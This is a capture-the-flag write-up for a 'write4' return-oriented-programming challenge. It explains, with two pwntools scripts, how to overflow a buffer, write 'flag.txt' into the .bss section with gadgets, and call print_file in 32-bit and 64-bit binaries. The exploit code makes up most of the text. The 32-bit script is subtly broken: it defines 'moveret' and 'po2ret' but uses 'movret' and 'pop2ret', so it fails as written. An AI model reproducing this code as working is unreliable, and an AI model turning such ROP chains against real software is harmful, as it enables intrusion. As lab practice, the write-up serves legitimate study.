# Write 4

## 32 bit

As the text says there is no "cat flag.txt", but if you list all the function you
will find "print_file" a function that will print the content of a file passed
as parameter.

To pass the string "flag.txt" to the fnction "print_file" you need to save it
on the bss part of the ELF file. To save it there is a gadget that take 4 byte and
save it on an addres of your choise. Then you need to copy the 4 byte that you want
to write in the variables, there is a gadget olso for this.

```python
from pwn import *

elf = context.binary = ELF('write432')
context.log_level = 'debug'

# We get the length of our junk part of the payload
p = process(elf.path)
p.sendline(cyclic(200))
p.wait()
eip = p.corefile.eip
offset = cyclic_find(eip)
print(offset)

rop = ROP(elf)
print_file = p32(elf.symbols['print_file'])
# Address of gadget to save in memory
moveret = p32(0x08048543)
po2ret = p32(rop.find_gadget(['pop edi', 'pop ebp', 'ret'])[0])

payload = offset * b'A'

payload += pop2ret
payload += p32(elf.bss())
payload += b'flag'
payload += movret

payload += pop2ret
payload += p32(elf.bss(4))
payload += b'.txt'
payload += movret

payload += print_file
payload += b'BBBB'
payload += p32(elf.bss())

print(payload)

p = process(elf.path)
p.sendline(payload)
p.readall()
```

## 64 bit

This is the same as for the 32 bit.

As before we need to find a way to pass to the function "print_file" the string "flag.txt"
as parameter.

From radare2 we can read the usefull function wich is the same as for the 32bit,
as we know the register edi is the lower part of the rdi register.

```python
from pwn import *

elf = context.binary = ELF('write4')
context.log_level = 'debug'

# We get the length of our junk part of the payload
p = process(elf.path)
p.sendline(cyclic(200, n=8))
p.wait()
fault = p.corefile.fault_addr
offset = cyclic_find(fault, n=8)
print(offset)

rop = ROP(elf)
print_file = p64(elf.symbols['print_file'])
# Address of gadget to save in memory
# pop rdi; ret
pop_rdi = p64(0x0000000000400693)
# mov qword ptr [r14], r15 ; ret
movret = p64(0x0000000000400628)
# pop r14; pop r15; ret
pop2ret = p64(0x0000000000400690)

payload = offset * b'A'

payload += pop2ret
payload += p64(elf.bss())
payload += b'flag.txt'
payload += movret

payload += pop_rdi
payload += p64(elf.bss())
payload += print_file

print(payload)

p = process(elf.path)
p.sendline(payload)
p.readall()
```
